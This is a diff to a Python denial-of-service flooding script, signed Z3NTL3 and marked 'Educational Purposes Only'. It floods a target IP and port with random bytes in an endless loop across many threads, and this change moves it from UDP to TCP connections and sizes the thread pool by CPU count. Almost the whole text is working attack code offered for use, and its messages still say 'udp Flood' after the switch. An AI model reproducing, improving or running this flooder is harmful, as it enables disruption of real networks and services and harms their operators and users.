@@ -3,6 +3,7 @@ import sys
 from concurrent.futures import Future
 from concurrent.futures import ThreadPoolExecutor
 from concurrent.futures import as_completed
+from os import cpu_count
 try:
     from random import randbytes
 except:
@@ -11,9 +12,11 @@ except:
 # Educational Purposes Only
 # Z3NTL3
 
+cores = cpu_count() * 2
 count = 0
 def Usage():
     print(f"""
+\033[32mUsage:\033[0m
 python3 {__file__} ip port bytes
 """)
 
@@ -23,6 +26,7 @@ try:
     bytesX = int(sys.argv[3])
     
 except:
+    print('hi')
     Usage()
     sys.exit(-1)
 def CheckValid():
@@ -36,20 +40,22 @@ def CheckValid():
     
 def Flooder(**pHu):
     global count
-    sVar = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    sVar = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
     try:
         z3Payload = randbytes(bytesX)
-        sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
+        sVar.connect((pHu['host_ip'],pHu['port']))
+        sendByte = sVar.send(z3Payload)
         count+=1
         return f"SEND {count} udp Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
-    except:
+    except Exception as e:
+        print(e)
         return f"udp Flood Failed On {pHu['host_ip']}:{pHu['port']}"
     finally:
        sVar.close()
     
 def Main():
     global count
-    pool =  ThreadPoolExecutor(max_workers=61)
+    pool =  ThreadPoolExecutor(max_workers=int(cores))
     while True:
         f = pool.submit(Flooder,host_ip=websiteHost_or_IP,port=portX)
         print(f.result())
